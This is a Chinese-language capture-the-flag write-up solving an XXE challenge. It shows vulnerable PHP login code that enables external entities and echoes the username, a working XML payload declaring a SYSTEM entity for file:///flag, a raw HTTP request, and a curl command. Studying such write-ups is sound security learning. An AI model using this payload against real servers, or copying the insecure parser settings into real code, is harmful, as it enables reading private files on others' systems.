# week3inject_me

## 题目简述

题目说明 flag 位于服务器本地文件 `/flag`，登录接口从原始 POST 请求体读取 XML。目标是利用 XML 外部实体读取本地文件，并借助响应中的用户名字段把内容带回。

## 解题过程

服务端的关键代码为：

```php
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');

$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
$creds = simplexml_import_dom($dom);

$username = $creds->username;
$password = $creds->password;
$result = sprintf(
    "<result><code>%d</code><msg>%s</msg></result>",
    0,
    $username
);
```

`libxml_disable_entity_loader(false)` 允许实体加载，`LIBXML_DTDLOAD` 处理 DTD，`LIBXML_NOENT` 把实体引用替换为实体内容。更关键的是，即使认证失败，响应仍把 `$username` 原样放进 `<msg>`，所以只需让 `username` 节点引用本地文件实体。

请求体如下：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
  <!ENTITY flag SYSTEM "file:///flag">
]>
<user>
  <username>&flag;</username>
  <password>anything</password>
</user>
```

发送时必须让请求体保持原始 XML，并设置与接口一致的内容类型：

```http
POST /doLogin.php HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
  <!ENTITY flag SYSTEM "file:///flag">
]>
<user><username>&flag;</username><password>anything</password></user>
```

也可以将 XML 保存为 `payload.xml` 后发送：

```text
curl -s -X POST \
  -H "Content-Type: application/xml" \
  --data-binary @payload.xml \
  "http://TARGET/doLogin.php"
```

认证会失败并返回 `code=0`，但 `/flag` 的内容已经作为实体替换结果出现在 `<msg>` 中：

```xml
<result><code>0</code><msg>这里是 /flag 的内容</msg></result>
```

## 方法总结

漏洞由三个条件共同构成：XML 解析器允许加载外部 DTD、启用了实体替换、解析后的可控字段又被响应回显。构造 `SYSTEM "file:///flag"` 外部实体并放入 `username` 即可完成本地文件读取；是否能通过登录认证并不重要。
